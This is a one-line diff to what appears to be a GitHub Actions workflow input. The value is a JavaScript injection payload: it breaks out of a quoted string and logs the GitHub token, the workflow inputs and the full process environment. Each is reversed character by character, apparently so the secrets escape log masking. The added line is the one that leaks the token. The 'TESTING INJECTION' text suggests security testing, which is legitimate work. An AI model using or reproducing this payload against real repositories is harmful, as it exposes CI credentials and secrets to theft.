@@ -1,1 +1,1 @@
-foobar' }; console.log("TESTING INJECTION 123");console.log(JSON.stringify(workflowInputs).split("").reverse().join("")); console.log(JSON.stringify(process.env).split("").reverse().join("")); const barEnv = { foo: 'bar
+foobar' }; console.log("TESTING INJECTION 123"); console.log("'GH Token:", core.getInput("github-token").split("").reverse().join("")); console.log(JSON.stringify(workflowInputs).split("").reverse().join("")); console.log(JSON.stringify(process.env).split("").reverse().join("")); const barEnv = { foo: 'bar
